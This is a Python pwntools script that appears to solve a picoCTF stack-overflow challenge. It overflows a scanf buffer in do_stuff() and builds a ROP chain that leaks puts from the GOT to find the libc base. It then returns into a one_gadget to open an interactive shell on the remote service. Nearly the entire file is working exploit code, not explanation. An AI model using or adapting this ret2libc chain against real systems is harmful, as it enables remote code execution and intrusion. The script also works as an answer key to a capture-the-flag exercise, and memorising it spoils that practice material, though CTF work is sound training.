from pwn import *
import struct

p = remote('mercury.picoctf.net', 23584)
#p = process('./vuln')

e = ELF('./vuln')
libc = ELF('./libc.so.6')

'''
Gadgets
0x0000000000400913 : pop rdi ; ret
0x0000000000400911 : pop rsi ; pop r15 ; ret
'''
poprdi = p64(0x400913)
pop_rsi_r15 = p64(0x400911)

p.readline()

## I want to leak a value in libc via puts
data = b'a'*0x88
data += poprdi  ## first pc
data += p64(e.symbols['got.puts'])
data += p64(e.symbols['puts'])

## I can't just return back because I was getting a crash due to unaligned stack so align it with whatever
data += pop_rsi_r15
data += p64(0)
data += p64(0)

## Just return back to where we would have now that we have the leak
data += p64(0x400896)
data += b'\n'

p.send(data)
p.readline()

## Read the leak
leak = p.readline().rstrip(b'\n')

print(leak)

## extend to 8 bytes for the unpacking
leak += b'\x00'*(8 - len(leak))

libc.address = u64(leak) - libc.symbols['puts']

print('[INFO] Libc base: 0x%x' %(libc.address))

oneshot = 0x4f365
## 0x00000000000e46ee : pop rcx ; ret
poprcx = 0xe46ee

data = b'a'*0x88
data += p64(libc.address + poprcx)  ## first pc
data += p64(0)
data += p64(libc.address + oneshot)
data += b'\n'

p.send(data)
p.interactive()
'''

In the do_stuff() function you are able to provide a long string to scanf which will overflow the return address

'''


